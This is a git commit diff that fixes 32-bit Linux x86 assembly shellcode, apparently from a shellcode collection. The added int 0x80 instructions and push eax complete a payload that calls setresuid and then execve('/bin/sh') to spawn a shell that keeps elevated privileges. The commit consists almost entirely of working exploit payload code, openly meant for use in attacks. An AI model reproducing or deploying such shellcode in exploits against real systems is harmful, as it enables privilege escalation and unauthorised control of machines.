34031c8a581378ce1d7069c48163739e78b7e2dd
aeolits <aeolits@protonmail.com>
2018-12-21 13:05:49 -0700

    fixed bug in last commit's shellcode

--- linux/32-bit/getresuid_setresuid_bin-sh.s
+++ linux/32-bit/getresuid_setresuid_bin-sh.s
@@ -22,9 +22,11 @@ BITS 32
 
     ; setresuid syscall
     mov al, 0xd0
+    int 0x80
 
     ;; execve("/bin/sh", ["/bin/sh", NULL], [NULL])
     xor eax, eax
+    push eax
     mov edx, esp    ; char **envp
     push 0x68732f2f ; //sh
     push 0x6e69622f ; /bin
@@ -35,3 +37,4 @@ BITS 32
 
     ; execve syscall
     mov al, 0x0b
+    int 0x80
